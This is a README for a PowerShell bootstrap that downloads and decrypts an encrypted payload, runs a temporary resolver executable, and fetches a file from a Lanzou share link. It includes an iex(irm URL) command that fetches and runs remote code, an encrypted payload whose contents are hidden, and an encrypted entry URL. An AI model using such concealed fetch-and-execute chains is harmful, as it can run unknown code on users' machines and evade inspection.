# bootstrap

AES-encrypted PowerShell bootstrap for downloading a file from a Lanzou share link.

## Files

- `Colud.ps1` - public loader. Downloads and decrypts `Payload.enc`.
- `Payload.enc` - AES-encrypted PowerShell payload.
- `Download.exe` - self-contained C++ resolver using WinHTTP.
- `Encrypt-Payload.ps1` - local tool for re-encrypting an updated payload.

## Usage

```powershell
iex(irm "https://vtlowkey.github.io/bootstrap/Colud.ps1")
```

The loader prompts for the decryption password:

```text
Enter decryption password:
```

For non-interactive use, set the password through an environment variable:

```powershell
$env:LANZOU_PAYLOAD_KEY = "your-password"
iex(irm "https://vtlowkey.github.io/bootstrap/Colud.ps1")
```

## Encryption

- PBKDF2-SHA256 with 150000 iterations
- AES-256-CBC with a random salt and IV
- HMAC-SHA256 for integrity/authentication
- Format: salt(16) + IV(16) + HMAC(32) + ciphertext

The password is not stored in this repository.

## Update the payload

1. Edit or create a plaintext `Payload.ps1` outside this repository.
2. Re-encrypt it:

```powershell
.\Encrypt-Payload.ps1 -InFile .\Payload.ps1 -OutFile .\Payload.enc
```

3. Commit only `Payload.enc`, never the plaintext payload.

## What it does

1. Downloads the encrypted payload.
2. Prompts for the password.
3. Verifies the HMAC and decrypts the payload.
4. Downloads `Download.exe` to `%TEMP%`.
5. Verifies the resolver SHA256.
6. Resolves the Lanzou share link and downloads the target file.
7. Deletes the temporary resolver.

Only execute scripts and binaries from sources you trust.

## Hide the entry URL

`Launcher.ps1` contains the entry URL encrypted with AES-256-CBC. The URL is not stored as plaintext in the file.

Run the launcher locally:

```powershell
.\Launcher.ps1
```

It decrypts the hidden URL, downloads `Colud.ps1`, and starts the existing encrypted-payload flow.

The AES key is embedded in the launcher so that it can run without an extra URL password. This hides the URL from casual inspection, but it is not a substitute for server-side access control. HTTPS still encrypts the network connection itself.
